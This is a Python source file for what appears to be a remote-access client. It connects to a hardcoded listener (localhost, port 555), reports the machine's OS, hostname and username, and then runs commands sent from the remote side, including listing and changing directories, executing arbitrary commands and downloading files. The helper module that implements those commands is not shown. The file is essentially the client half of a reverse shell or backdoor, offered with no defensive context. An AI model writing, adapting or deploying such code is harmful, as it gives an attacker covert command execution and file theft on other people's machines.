import platform
import socket
from exec import tools
import getpass

PORT=555
HOST="127.0.0.1"

class Client:
    def __init__(self):
        self.s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.user = getpass.getuser()
        self.puter=platform.node()
        self.osm=platform.system()
        self.connect()
    
    def connect(self):
        self.s.connect((HOST,PORT))
        self.s.send((self.osm+" "+self.puter+" "+self.user).encode())

    def exec(self,size):
        print(self.osm)
        while True:
            cmd1=self.s.recv(size).decode()
            cm=cmd1.split(" ")
            if cmd1=="ls":
                self.s.send(tools.ls(self.osm,self.s).encode())
            elif cmd1=="pwd":
                self.s.send(tools.pwd().encode())
            elif cm[0]=="cd":
                self.s.send(tools.cd(cm).encode())
            elif cm[0]=="execute":
                res=tools.execute(self.osm,cm)
              
                self.s.send(res.encode())
            elif cm[0]=="download":
                try:
                    res=tools.download(self.s,cm[1],8192)
                    self.s.send(res.encode())
                except:
                    self.s.send("no file specified".encode())
            elif cmd1=="exit":
                print("exit")
                
                self.s.close()
                break
            elif cmd1=="help":
                self.s.send(tools.help().encode())
            else:
                res="unknown command"
                self.s.send(res.encode())
        

client = Client()
client.exec(1024)





